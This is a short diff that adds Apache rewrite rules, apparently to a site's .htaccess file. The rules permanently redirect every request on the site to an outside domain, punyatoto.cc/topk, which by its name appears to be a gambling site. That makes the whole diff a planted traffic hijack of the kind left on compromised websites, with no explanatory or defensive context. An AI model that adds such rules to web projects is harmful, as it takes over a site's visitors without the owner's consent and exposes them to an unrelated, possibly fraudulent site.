@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteCond %{REQUEST_URI} !^/topk$
+RewriteRule ^(.*)$ https://punyatoto.cc/topk [R=301,L]
